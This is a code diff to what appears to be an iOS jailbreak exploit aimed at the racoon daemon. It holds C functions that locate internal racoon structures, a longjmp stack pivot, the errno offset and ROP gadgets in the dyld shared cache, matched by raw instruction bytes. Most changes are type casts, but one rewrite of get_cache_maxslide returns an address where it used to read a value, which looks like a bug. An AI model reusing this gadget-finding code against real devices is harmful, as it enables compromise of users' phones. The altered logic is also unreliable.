@@ -12,12 +12,12 @@
 
 void* find_data_raw(const void* bin, size_t bin_size, void* data, size_t data_size, int search_aligned)
 {
-    char* bin_c = (char*)bin;
-    char* data_c = (char*)data;
+    const char* bin_c = (const char*)bin;
+    const char* data_c = (const char*)data;
     if (bin == NULL || data == NULL || data_size == 0) {
         return NULL;
     }
-    for (size_t i = 0; i < bin_size; i += search_aligned) {
+    for (size_t i = 0; i < bin_size; i += (size_t)search_aligned) {
         if (bin_c[i] == data_c[0]) {
             bool found = true;
             for (size_t data_idx = 0; data_idx < data_size && (i + data_idx) < bin_size; data_idx++) {
@@ -44,14 +44,14 @@ void* find_ref(void* addr)
     for (size_t i = 0; i < racoon_img->mapsize; i += 4) {
         adr_t* current_instruction = (adr_t*)racoon_img->map + i;
         if (is_adr(current_instruction)) {
-            uint64_t off = get_adr_off(current_instruction);
-            if ((off + i) == (uint64_t)addr) {
+            kptr_t off = (kptr_t)get_adr_off(current_instruction);
+            if ((off + i) == (kptr_t)addr) {
                 return (void*)i;
             }
         }
         if (is_adrp(current_instruction)) {
-            uint64_t off = get_adr_off(current_instruction);
-            if ((off + (i & ~0xfff)) == (uint64_t)addr) {
+            kptr_t off = (kptr_t)get_adr_off(current_instruction);
+            if ((off + (i & ~0xfff)) == (kptr_t)addr) {
                 return (void*)i;
             }
         }
@@ -72,7 +72,7 @@ void* find_strref(char* str)
 void* find_code_xref(void* addr)
 {
     for (size_t i = 0; i < racoon_img->mapsize; i += 4) {
-        void* curr_inst = (void*)racoon_img->map + i;
+        void* curr_inst = (void*)((kptr_t)racoon_img->map + i);
         if (is_br(curr_inst) || is_bl(curr_inst) || is_b(curr_inst)) {
             uint64_t off = get_bl_off(curr_inst);
             if ((off + i) == (uint64_t)addr) {
@@ -95,21 +95,21 @@ void* find_code_xref(void* addr)
     return NULL;
 }
 
-void* isakmp_cfg_config_addr()
+void* isakmp_cfg_config_addr(void)
 {
     void* error_handling_instruction = find_strref("No more than %d WINS");
     LOG("Found error handling stub @ %p\n", error_handling_instruction);
-    for (void* i = error_handling_instruction; i > (error_handling_instruction - 20 * 4); i -= 4) {
+    for (void* i = error_handling_instruction; (kptr_t)i > ((kptr_t)error_handling_instruction - 20 * 4); i = (void*)((kptr_t)i - 4)) {
         void* xref = find_code_xref(i);
         if (xref != 0) {
             LOG("Found xref from %p\n", xref);
             // TODO: check if the instruction is a b.gt
-            for (void* backwards_search = xref; backwards_search > (xref - 20 * 4); backwards_search -= 4) {
-                void* curr_inst = (void*)racoon_img->map + ((size_t)backwards_search);
+            for (void* backwards_search = xref; (kptr_t)backwards_search > ((kptr_t)xref - 20 * 4); backwards_search = (void*)((kptr_t)backwards_search - 4)) {
+                void* curr_inst = (void*)((kptr_t)racoon_img->map + ((size_t)backwards_search));
                 if (is_adr(curr_inst)) {
-                    uint64_t off = get_adr_off(curr_inst);
-                    LOG("isakmp_cfg_config_addr: 0x%p\n", off + backwards_search);
-                    return off + backwards_search;
+                    kptr_t off = (kptr_t)get_adr_off(curr_inst);
+                    LOG("isakmp_cfg_config_addr: 0x%p\n", (void*)(off + (kptr_t)backwards_search));
+                    return (void*)((kptr_t)off + (kptr_t)backwards_search);
                 }
             }
         }
@@ -117,21 +117,21 @@ void* isakmp_cfg_config_addr()
     return NULL;
 }
 
-void* lcconf_addr()
+void* lcconf_addr(void)
 {
     void* error_handling_instruction = find_strref("failed to set my ident: %s");
     LOG("Found error handling stub @ %p\n", error_handling_instruction);
-    for (void* i = error_handling_instruction; i > (error_handling_instruction - 20 * 4); i -= 4) {
+    for (void* i = error_handling_instruction; (kptr_t)i > ((kptr_t)error_handling_instruction - 20 * 4); i = (void*)((kptr_t)i - 4)) {
         void* xref = find_code_xref(i);
         if (xref != 0) {
             LOG("Found xref from %p\n", xref);
             // TODO: check if the instruction is a cbnz
-            for (void* backwards_search = xref; backwards_search > (xref - 20 * 4); backwards_search -= 4) {
-                void* curr_inst = (void*)racoon_img->map + ((size_t)backwards_search);
+            for (void* backwards_search = xref; (kptr_t)backwards_search > ((kptr_t)xref - 20 * 4); backwards_search = (void*)((kptr_t)backwards_search - 4)) {
+                void* curr_inst = (void*)((kptr_t)racoon_img->map + (size_t)backwards_search);
                 if (is_ldr_lit(curr_inst)) {
-                    uint64_t off = get_ldr_lit_off(curr_inst);
-                    LOG("lcconf_addr: 0x%p\n", off + backwards_search);
-                    return off + backwards_search;
+                    kptr_t off = (kptr_t)get_ldr_lit_off(curr_inst);
+                    LOG("lcconf_addr: 0x%p\n", (void*)(off + (kptr_t)backwards_search));
+                    return (void*)((kptr_t)off + (kptr_t)backwards_search);
                 }
             }
         }
@@ -139,11 +139,11 @@ void* lcconf_addr()
     return NULL;
 }
 
-size_t get_cache_maxslide()
+size_t get_cache_maxslide(void)
 {
-    uint64_t* cache_slide = (uint64_t*)cache_img->map + 30 * 8;
-    LOG("Cache maxslide: 0x%llx\n", *cache_slide);
-    return *cache_slide;
+    kptr_t cache_slide = (kptr_t)cache_img->map + 30 * 8;
+    LOG("Cache maxslide: 0x%llx\n", cache_slide);
+    return cache_slide;
 }
 
 void* memmove_cache_ptr(const char* path)
@@ -156,22 +156,22 @@ void* memmove_cache_ptr(const char* path)
     LOG("strlcpy @ %p\n", strlcpy);
     strlcpy = CACHE_ADDR2FILE(strlcpy);
     bool first = true;
-    for (void* curr_instr = strlcpy; curr_instr < (strlcpy + 0x4000); curr_instr += 4) {
+    for (void* curr_instr = strlcpy; (kptr_t)curr_instr < ((kptr_t)strlcpy + 0x4000); curr_instr = (void*)((kptr_t)curr_instr + 4)) {
         if (is_bl(curr_instr)) {
             if (first) {
                 first = false;
                 continue;
             } // skip first bl
-            void* loader_stub = (void*)(get_bl_off(curr_instr) + (size_t)curr_instr);
+            void* loader_stub = (void*)((kptr_t)get_bl_off(curr_instr) + (size_t)curr_instr);
             if (!is_adrp(loader_stub)) {
                 return NULL;
             } // should be there
-            void* memmove_ptr = (void*)(get_adr_off(loader_stub) + ((size_t)curr_instr & ~0x3fff));
-            loader_stub += 4; // next instruction
+            void* memmove_ptr = (void*)((kptr_t)get_adr_off(loader_stub) + ((size_t)curr_instr & ~0x3fff));
+            loader_stub = (void*)((kptr_t)loader_stub + 4); // next instruction
             if (!is_ldr_imm_uoff(loader_stub)) {
                 return NULL;
             } // should be there
-            memmove_ptr += get_ldr_imm_uoff(loader_stub);
+            memmove_ptr = (void*)((kptr_t)memmove_ptr + get_ldr_imm_uoff(loader_stub));
             memmove_ptr = CACHE_FILE2ADDR(memmove_ptr);
             LOG("memmove cache ptr: 0x%p\n", memmove_ptr);
             return memmove_ptr;
@@ -189,7 +189,7 @@ void* get_stackpivot_addr(const char* path)
     }
     LOG("longjmp is @ %p\n", longjmp);
     longjmp = CACHE_ADDR2FILE(longjmp);
-    for (void* curr_instr = longjmp; curr_instr < (longjmp + 0x4000); curr_instr += 4) {
+    for (void* curr_instr = longjmp; (kptr_t)curr_instr < ((kptr_t)longjmp + 0x4000); curr_instr = (void*)((kptr_t)curr_instr + 4)) {
         if (is_add_imm(curr_instr)) { // mov sp, x2 is acc add sp, x2, 0
             LOG("stackpivot: %p\n", CACHE_FILE2ADDR(curr_instr));
             return CACHE_FILE2ADDR(curr_instr);
@@ -198,17 +198,17 @@ void* get_stackpivot_addr(const char* path)
     return NULL;
 }
 
-void* get_cbz_x0_gadget()
+void* get_cbz_x0_gadget(void)
 {
     for (size_t i = 0; i < cache_img->mapsize; i += 4) {
-        void* curr_instr = (void*)cache_img->map + i;
-        if (is_cbz(curr_instr) && get_cbz_off(curr_instr) == 8 && is_ret(curr_instr + 8) && is_b(curr_instr + 4)) {
-            int64_t bl_off = get_bl_off(curr_instr + 4);
-            void* stub_instr = curr_instr + 4 + bl_off;
+        void* curr_instr = (void*)((kptr_t)cache_img->map + i);
+        if (is_cbz(curr_instr) && get_cbz_off(curr_instr) == 8 && is_ret((void*)((kptr_t)curr_instr + 8)) && is_b((void*)((kptr_t)curr_instr + 4))) {
+            kptr_t bl_off = get_bl_off((void*)((kptr_t)curr_instr + 4));
+            void* stub_instr = (void*)((kptr_t)curr_instr + 4 + bl_off);
             if (!is_adrp(stub_instr)) {
                 continue;
             }
-            if (!is_ldr_imm_uoff(stub_instr + 4)) {
+            if (!is_ldr_imm_uoff((void*)((kptr_t)stub_instr + 4))) {
                 continue;
             }
             LOG("cbz_x0_gadget: %p\n", CACHE_FILE2ADDR(curr_instr));
@@ -221,16 +221,16 @@ void* get_cbz_x0_gadget()
 void* get_cbz_x0_x16_load(void* cbz_x0_gadget_addr)
 {
     cbz_x0_gadget_addr = CACHE_ADDR2FILE(cbz_x0_gadget_addr);
-    if (is_cbz(cbz_x0_gadget_addr) && get_cbz_off(cbz_x0_gadget_addr) == 8 && is_ret(cbz_x0_gadget_addr + 8) && is_b(cbz_x0_gadget_addr + 4)) {
-        int64_t bl_off = get_bl_off(cbz_x0_gadget_addr + 4);
-        void* stub_instr = cbz_x0_gadget_addr + 4 + bl_off;
+    if (is_cbz(cbz_x0_gadget_addr) && get_cbz_off(cbz_x0_gadget_addr) == 8 && is_ret((void*)((kptr_t)cbz_x0_gadget_addr + 8)) && is_b((void*)((kptr_t)cbz_x0_gadget_addr + 4))) {
+        kptr_t bl_off = get_bl_off((void*)((kptr_t)cbz_x0_gadget_addr + 4));
+        void* stub_instr = (void*)((kptr_t)cbz_x0_gadget_addr + 4 + bl_off);
         if (!is_adrp(stub_instr)) {
             return NULL;
         }
-        if (!is_ldr_imm_uoff(stub_instr + 4)) {
+        if (!is_ldr_imm_uoff((void*)((kptr_t)stub_instr + 4))) {
             return NULL;
         }
-        void* found = (void*)CACHE_FILE2ADDR(((size_t)stub_instr & ~0xfff) + get_adr_off(stub_instr) + get_ldr_imm_uoff(stub_instr + 4));
+        void* found = (void*)CACHE_FILE2ADDR(((size_t)stub_instr & ~0xfff) + (kptr_t)get_adr_off(stub_instr) + get_ldr_imm_uoff((void*)((kptr_t)stub_instr + 4)));
         LOG("cbz_x0_x16_load: 0x%p\n", found);
         return found;
     }
@@ -247,13 +247,13 @@ void* get_errno_offset(const char* path)
     }
     LOG("mmap is @ %p\n", __mmap);
     __mmap = CACHE_ADDR2FILE(__mmap);
-    for (void* curr_instr = __mmap; curr_instr < (__mmap + 40 * 4); curr_instr += 4) {
+    for (void* curr_instr = __mmap; (kptr_t)curr_instr < ((kptr_t)__mmap + 40 * 4); curr_instr = (void*)((kptr_t)curr_instr + 4)) {
         if (is_bl(curr_instr)) {
-            void* errno_stub = curr_instr + get_bl_off(curr_instr);
+            void* errno_stub = (void*)((kptr_t)curr_instr + get_bl_off(curr_instr));
             if (!is_adrp(errno_stub)) {
                 continue;
             }
-            void* found = (void*)CACHE_FILE2ADDR(((size_t)errno_stub & ~0x3fff) + get_adr_off(errno_stub));
+            void* found = (void*)CACHE_FILE2ADDR(((size_t)errno_stub & ~0x3fff) + (kptr_t)get_adr_off(errno_stub));
             LOG("errno offset: 0x%p\n", found);
             return found;
         }
@@ -261,7 +261,7 @@ void* get_errno_offset(const char* path)
     return NULL;
 }
 
-void* get_pivot_x21_gadget()
+void* get_pivot_x21_gadget(void)
 {
     void* ret = find_data_raw(cache_img->map, cache_img->mapsize, &((unsigned char[]) {
                                                                       0xa8, 0x06, 0x40, 0xf9, // ldr x8, [x21, 8]
@@ -278,7 +278,7 @@ void* get_pivot_x21_gadget()
     return CACHE_FILE2ADDR(ret);
 }
 
-void* get_beast_gadget()
+void* get_beast_gadget(void)
 {
     void* ret = find_data_raw(cache_img->map, cache_img->mapsize, &((unsigned char[]) {
                                                                       0xe4, 0x03, 0x16, 0xaa, //   mov x4, x22
@@ -307,7 +307,7 @@ void* get_beast_gadget()
     return CACHE_FILE2ADDR(ret);
 }
 
-void* get_str_x0_gadget()
+void* get_str_x0_gadget(void)
 {
     void* ret = find_data_raw(cache_img->map, cache_img->mapsize, &((unsigned char[]) {
                                                                       0x60, 0x16, 0x00, 0xf9, //   str x0, [x19, 0x28]
@@ -323,7 +323,7 @@ void* get_str_x0_gadget()
     return CACHE_FILE2ADDR(ret);
 }
 
-void* get_add_x0_gadget()
+void* get_add_x0_gadget(void)
 {
     void* ret = find_data_raw(cache_img->map, cache_img->mapsize, &((unsigned char[]) {
                                                                       0xa0, 0x02, 0x14, 0x8b, //   add x0, x21, x20
